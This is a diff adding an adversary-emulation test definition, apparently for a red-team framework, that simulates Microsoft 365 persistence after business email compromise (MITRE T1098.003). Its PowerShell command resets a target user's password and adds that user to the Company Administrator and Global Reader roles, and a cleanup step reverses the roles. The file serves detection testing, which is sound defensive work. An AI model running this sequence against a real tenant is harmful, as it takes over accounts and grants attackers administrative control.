@@ -1,0 +1,33 @@
+- description: "This test looks at simulating the an adversary described in the following\
+    \ blog post. It involves resetting the password of a normal user and adding to\
+    \ the company administrator role within M365.\n Reference: https://www.huntress.com/blog/business-email-compromise-via-azure-administrative-privileges\n"
+  id: 300411e901bb14245148885ad5e72882
+  name: Simulate - Post BEC persistence via user password reset followed by user added
+    to company administrator role
+  platforms:
+    unknown:
+      psh:
+        cleanup: Import-Module MSOnline; $password = ConvertTo-SecureString -String
+          "p4sswd" -AsPlainText -Force; $credential = New-Object -TypeName System.Management.Automation.PSCredential
+          -ArgumentList "jonh@contoso.com", $password; Connect-MsolService -Credential
+          $credential; Remove-MsolRoleMember -RoleName "Company Administrator" -RoleMemberType
+          User -RoleMemberEmailAddress "default"; Remove-MsolRoleMember -RoleName
+          "Global Reader" -RoleMemberType User -RoleMemberEmailAddress "default"
+        command: 'Import-Module MSOnline; Import-Module AzureAD; $password = ConvertTo-SecureString
+          -String "p4sswd" -AsPlainText -Force; $credential = New-Object -TypeName
+          System.Management.Automation.PSCredential -ArgumentList "jonh@contoso.com",
+          $password; $targetsecurepw = ConvertTo-SecureString -String "Ohn05GeMe#$"
+          -AsPlainText -Force; Connect-MsolService -Credential $credential -ErrorAction:SilentlyContinue;
+          Connect-AzureAD -Credential $credential -ErrorAction:SilentlyContinue; ;
+          #Saving the ObjectId of the target_user into a variable; $target_objid =
+          Get-AzureADUser -filter "userPrincipalName eq ''default''" | Select-Object
+          -ExpandProperty ObjectId; ; #Reset the password of the target_user; Set-AzureADUserPassword
+          -ObjectId  $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue;
+          ; #Adding target_user; Add-MsolRoleMember -RoleName "Company Administrator"
+          -RoleMemberEmailAddress "default"; Add-MsolRoleMember -RoleName "Global
+          Reader" -RoleMemberEmailAddress "default"'
+        payloads: []
+  tactic: multiple
+  technique:
+    attack_id: T1098.003
+    name: 'Account Manipulation: Additional Cloud Roles'
